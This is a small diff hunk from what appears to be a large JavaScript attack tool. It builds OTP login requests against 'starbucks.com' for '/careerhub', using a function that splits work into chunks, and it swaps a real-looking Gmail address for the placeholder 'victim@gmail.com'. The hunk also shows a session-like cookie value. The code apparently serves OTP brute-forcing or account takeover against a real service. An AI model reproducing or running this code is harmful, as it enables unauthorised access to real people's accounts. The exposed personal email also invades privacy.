@@ -125093,7 +125093,7 @@ async function distributeTasks(chunk) {
             diehed: headers.map(h => `${encodeURIComponent(h.name)}nnpp${encodeURIComponent(h.val)}`).join('nndd'),
             diecok: encodeURIComponent('_vs=2779459665015266793:1739291047.3965724:2412637813536564357'),
             diebod: encodeURIComponent(JSON.stringify({
-                email: 'blondyblade@gmail.com',
+                email: 'victim@gmail.com',
                 otp: otp,
                 domain: 'starbucks.com',
                 next: '/careerhub'
